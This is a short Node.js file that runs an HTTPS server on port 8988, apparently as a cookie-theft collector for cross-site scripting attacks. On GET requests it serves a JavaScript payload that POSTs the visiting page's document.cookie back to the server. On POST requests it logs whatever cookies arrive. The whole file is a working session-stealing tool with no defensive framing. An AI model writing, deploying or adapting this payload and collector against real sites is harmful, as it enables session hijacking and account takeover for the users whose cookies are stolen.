const https = require('https');
const fs = require('fs');

const options = {
  key: fs.readFileSync('keyDecrypt.pem'),
  cert: fs.readFileSync('cert.pem')
};

https.createServer(options, function(req, res) {
  if(req.method == 'POST'){
    req.on('data', function(chunk){
      console.log(chunk.toString());
    });
    req.on('end', function(){
      res.end();
    });
  }
  else{
    res.writeHead(200);
    res.end('var r= new XMLHttpRequest();r.open("POST","https://localhost:8988");r.send(document.cookie);');
  }
}).listen(8988);
